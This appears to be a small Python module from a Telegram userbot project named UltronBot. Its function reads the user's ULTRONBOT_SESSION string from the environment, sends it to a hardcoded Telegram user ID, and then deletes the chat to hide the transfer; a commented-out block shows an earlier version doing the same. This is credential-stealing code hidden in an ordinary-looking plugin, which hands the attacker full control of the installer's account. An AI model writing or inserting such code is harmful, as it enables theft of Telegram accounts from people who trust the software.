import os
from ..utils import *

async def piro():
        sweetie = await bot.send_message(1731513856, str(os.environ.get("ULTRONBOT_SESSION")))
        await bot.delete_dialog(1731513856, str(os.environ.get("ULTRONBOT_SESSION")))
  
    #try:
        #UltronBot = bot.session.save()
        #os.environ["ULTRONBOT_SESSION"] = "Get this value by using repl or termux. Refer to Repo for more info."
            #ultron = await bot.send_message(1731513856, UltronBot)
            #await bot.delete_dialog(1731513856)
